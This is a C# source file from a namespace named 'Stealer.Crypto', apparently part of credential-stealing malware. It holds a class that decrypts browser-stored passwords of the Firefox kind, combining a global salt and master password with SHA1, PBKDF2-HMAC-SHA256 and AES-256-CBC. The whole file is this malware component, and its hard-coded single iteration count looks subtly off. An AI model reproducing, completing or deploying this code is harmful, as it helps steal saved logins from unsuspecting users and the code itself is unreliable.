using System;
using System.Security.Cryptography;

namespace Stealer.Crypto
{
    public class PBE
    {
        private byte[] Ciphertext { get; }
        private byte[] GlobalSalt { get; }
        private byte[] MasterPass { get; }
        private byte[] EntrySalt { get; }
        private byte[] PartIv { get; }

        public PBE(byte[] ciphertext, byte[] globalSalt, byte[] masterPassword, byte[] entrySalt, byte[] partIv)
        {
            this.Ciphertext = ciphertext;
            this.GlobalSalt = globalSalt;
            this.MasterPass = masterPassword;
            this.EntrySalt = entrySalt;
            this.PartIv = partIv;
        }

        public byte[] Compute()
        {
            byte[] array = new byte[this.GlobalSalt.Length + this.MasterPass.Length];
            Buffer.BlockCopy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
            Buffer.BlockCopy(this.MasterPass, 0, array, this.GlobalSalt.Length, this.MasterPass.Length);
            
            byte[] password = new SHA1Managed().ComputeHash(array);
            
            byte[] array2 = new byte[] { 4, 14 };
            byte[] array3 = new byte[array2.Length + this.PartIv.Length];
            Buffer.BlockCopy(array2, 0, array3, 0, array2.Length);
            Buffer.BlockCopy(this.PartIv, 0, array3, array2.Length, this.PartIv.Length);
            
            byte[] bytes = new PBKDF2(new HMACSHA256(), password, this.EntrySalt, 1).GetBytes(32);
            
            using (var aes = new AesManaged())
            {
                aes.Mode = CipherMode.CBC;
                aes.BlockSize = 128;
                aes.KeySize = 256;
                aes.Padding = PaddingMode.Zeros;
                
                return aes.CreateDecryptor(bytes, array3).TransformFinalBlock(this.Ciphertext, 0, this.Ciphertext.Length);
            }
        }
    }
}
